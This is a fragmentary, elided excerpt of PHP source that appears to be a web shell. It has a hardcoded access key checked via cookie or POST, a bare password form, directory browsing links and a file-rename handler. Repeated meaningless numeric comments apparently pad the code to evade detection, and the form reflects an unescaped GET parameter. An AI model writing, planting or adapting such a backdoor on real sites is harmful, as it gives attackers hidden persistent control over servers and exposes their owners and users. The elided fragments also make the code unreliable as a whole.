...
$auth_key = "c93ef613c69e7f82b5446413c46b0aea";
...
$pass = false;
if (isset($_COOKIE['pw_name_59848'])) {
    if(($_COOKIE['pw_name_59848']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_59848'])) {
        if(($_POST['pw_name_59848']) == $auth_key) {
            setcookie("pw_name_59848", $_POST['pw_name_59848']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_59848' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774991560 1724682774734499 1724682774587568 1724682774771894
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774991560 1724682774734499 1724682774587568 1724682774771894
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774991560 1724682774734499 1724682774587568 1724682774771894
            $name = PATH . "/" . $_GET['r'];
